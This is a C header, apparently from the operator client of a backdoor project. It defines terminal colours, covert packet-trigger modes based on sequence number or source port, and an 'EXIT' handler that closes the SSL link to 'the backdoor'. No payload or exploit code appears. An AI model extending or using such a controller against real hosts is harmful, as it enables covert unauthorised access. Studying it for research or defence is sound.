#ifndef __CLIENT_COMMON_H
#define __CLIENT_COMMON_H

#include "openssl/err.h"
#include "openssl/ssl.h"
#include <arpa/inet.h>
#include <errno.h>
#include <malloc.h>
#include <netinet/in.h>
#include <resolv.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>
#include "../../common/c&c.h"

#define KGRN "\x1B[32m"
#define KYLW "\x1B[33m"
#define KBLU "\x1B[34m"
#define KMGN "\x1B[35m"
#define KRED "\x1B[31m"
#define RESET "\x1B[0m"

#define CLIENT_MODE_LIVE_COMMAND 0
//Global variable, specifying current client mode
int client_mode = CLIENT_MODE_LIVE_COMMAND;

#define GC_SERVER_CLOSE_CONN "EXIT"

#define CLIENT_MULTI_PACKET_TRIGGER_MODE_SEQ_NUM 0
#define CLIENT_MULTI_PACKET_TRIGGER_MODE_SRC_PORT 1


/**
 * @brief Manages the result of a possible global command understood by the client overall
 * (independent of the current mode) and returns 1 if it really was a global command
 * or 0 if it was not.
 * 
 * @param buf 
 * @return int 
 */
int manage_global_command(char* buf, SSL* ssl){
    if(strncmp(buf, GC_SERVER_CLOSE_CONN, strlen(GC_SERVER_CLOSE_CONN))==0){
		if(ssl != NULL){
            //If in a ssl connection
            char* request = CC_PROT_FIN;
            SSL_write(ssl, request, strlen(request));
            //We must exit now
            printf("[" KBLU "INFO" RESET "]""Connection with the backdoor halted\n");
            exit(0);
        }
	}
	
    //Not a recognized global command
    return 0;
}

#endif